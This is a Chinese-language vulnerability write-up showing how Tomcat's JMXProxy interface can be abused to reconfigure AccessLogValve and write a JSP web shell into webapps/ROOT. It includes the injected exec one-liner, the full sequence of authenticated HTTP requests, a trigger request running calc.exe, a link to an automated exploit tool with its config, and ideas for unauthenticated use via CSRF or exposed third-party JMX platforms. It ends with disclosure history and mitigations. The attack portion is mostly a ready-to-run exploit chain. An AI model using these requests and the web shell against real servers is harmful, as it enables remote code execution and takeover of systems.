%{p}i Runtime.getRuntime().exec(request.getParameter("cmd")); %{s}i
GET /manager/jmxproxy/?
set=Catalina:type=Valve,host=localhost,name=AccessLogValve&att=suffix&val=.jsp 
HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Authorization: Basic BASE64(username:password)
第四步：
修改日志存储目录到可解析 JSP 的目录： webapps/ROOT
第五步：
修改日志文件名日期格式目的是：触发 AccessLogValve 的 rotate 功能
在 log 日志记录信息的第一行调用 rotate 方法
跟入 rotate 方法
跟入 open 方法如果新的 fileDateFormatter 不同则 FileOutputStream 写入新文件
GET /manager/jmxproxy/?
set=Catalina:type=Valve,host=localhost,name=AccessLogValve&att=prefix&val=shell 
HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Authorization: Basic BASE64(username:password)
GET /manager/jmxproxy/?
set=Catalina:type=Valve,host=localhost,name=AccessLogValve&att=directory&val=web
apps/ROOT HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Authorization: Basic BASE64(username:password)
public void log(CharArrayWriter message) {
    rotate();
    // ...
}
public void rotate() {
    // ...
    String tsDate;
    // Check for a change of date
    tsDate = fileDateFormatter.format(new Date(systime));
    // If the date has changed, switch log files
    if (!dateStamp.equals(tsDate)) {
        close(true);
        dateStamp = tsDate;
        open();
    }
    // ...
}
新日志文件名来自于 prefix 和 sufix 的拼接
发送请求 Payload
第六步：
发送带有 p 和 s 请求头的请求，成功写入一句话
RCE：
我将以上发包的过程自动化，成功利用
protected synchronized void open() {
    // Open the current log file
    // If no rotate - no need for dateStamp in fileName
    File pathname = getLogFile(rotatable && !renameOnRotate);
    // ...
    writer = new PrintWriter(new BufferedWriter(new OutputStreamWriter(
        new FileOutputStream(pathname, true), charset), 128000),
                             false);
    // ...
}
private File getLogFile(boolean useDateStamp) {
    // ...
    File dir = getDirectoryFile();
    // ...
    pathname = new File(dir.getAbsoluteFile(), prefix + suffix);
    // ...
    return pathname;
}
GET /manager/jmxproxy/?
set=Catalina:type=Valve,host=localhost,name=AccessLogValve&att=fileDateFormat&va
l= HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Authorization: Basic BASE64(username:password)
GET / HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
p: //
GET /shell.jsp?cmd=calc.exe HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
0x05 实战
虽说 RCE 成功但是：需要有基础认证才可以触发漏洞
目前来看这仅是一种鸡肋的后台 RCE 手段，有必要研究一下实际的利用
直接的想法是： Manager 弱口令，这个没有讨论的必要
是否可以不认证就利用（借助第三方平台）
值得说明的一点是：黑盒情况下不能确定其他平台监控管理是否基于 JMXProxy
假设某平台底层基于 JMXProxy 提供的 API 那么相当于是一个绕过
假设某平台并不基于 JMXProxy 但是可以修改 AccessLogValve 属性同样可以 RCE
所以无论第三方平台是否基于 JMXProxy 实现监控只要可以修改目标数据即可 RCE （参考上图）
通过一些手段我找到了不少类似下图的管理平台，利用方式一眼即可看出
检查了其他端口，开着基于 Java 的 Web 服务，99%概率跑在 Tomcat 下，后续就不多写了
另外在 Apache Tomcat 的文档中明确写出：只有 manager-gui 受到 CSRF 保护而 JMX 不受保护
因此容易想到基于 CSRF 或 CSRF+XSS 的利用方式，由于 JMX 接口是 GET 反而更容易利用
对于存在 XSS 漏洞的情况下，更加容易利用
0x07 总结
我写了一个自动利用的工具：https://github.com/4ra1n/tomcat-jmxproxy-rce-exp
在 tomcat/conf/tomcat-users.xml 配置
修改 config.ini 利用文件，然后一把梭即可复现
The HTML interface is protected against CSRF (Cross-Site Request Forgery) 
attacks
but the text and JMX interfaces cannot be protected.
执行 EXP 程序： ./tomcat-jmxproxy-rce-exp
正如开头所说，虽然 Tomcat 官方不认可，但我认为该漏洞的危害大于一些 Tomcat 曾经的 RCE CVE
官方否认漏洞的四个原因是：
用户必须开启 manager 功能，在默认 Tomcat 中是关闭的
用户必须暴漏 manager/jmxproxy 到公网
用户必须使用了弱口令
如果是非弱口令的情况下 Tomcat 已有 LockOutRealm 可以防御
其实 Tomcat 官方否认是理由充足的，但他们没有考虑到第三方平台的影响和实际的危害
例如曾经的 Tomcat Session RCE 条件同样高，甚至需要基于文件上传漏洞，实战价值未必大
个人认为 JMXProxy 漏洞虽然有限制条件，但在整个漏洞利用链中该限制条件是可以被绕过的
后来我反驳过官方：
Tomcat Session RCE 在实战中不可能遇到，或者概率极小，但是你们认可了
通过第三方 JMX 平台未授权造成的 RCE 案例我找到了多个，并且理论上只要愿意找还会有更多
从实际危害角度来看，显然我报告的漏洞存在更大的危害和风险，为什么不认可
官方回复很简单：无论危害多大，你说的都是用户的错误，不是 Tomcat 的错误
从另一个角度来看，该漏洞可以被理解为未授权访问或者越权操作的漏洞
使用 manager-gui 是最高的权限，可以直接启动停止和部署war包
使用 manager-jmx 是较低的权限，理论上只能监控和修改部分变量
如果一个 manager-jmx 用户可以通过一些手段（例如 RCE ）达到 manager-gui 能做的事情，这是否可以
认为是一种漏洞？
如果我最初提交给 Tomcat 的报告这样来写，会不会得到认可？
0x08 修复
我向 Tomcat 官方建议的修复方案是：
在文档中明确说明： JMXProxy 存在 RCE 的安全风险
# target ip
host=127.0.0.1
# target port
port=8080
# target tomcat jmxproxy username
username=admin
# target tomcat jmxproxy password
password=123456
# execute command
cmd=calc.exe
限制对 AccessLogValve 属性的修改或者设置为只读
由于业务需要不能限制功能的话，至少限制 suffix 不能为 .jsp 等可被解析执行的后缀
不过 Tomcat 官方并没有采纳，他们不认为这是漏洞
对于实际的项目来说，修复方案如下：
如果开启了 manager-jmx 功能务必设置强密码
如果使用了 MX4J 等第三方平台对 JMX 进行管理，检查是否可以未授权访问
如果自己编写基于 Tomcat 的 JMX 管理功能，应该对 AccessLogValve 属性进行限制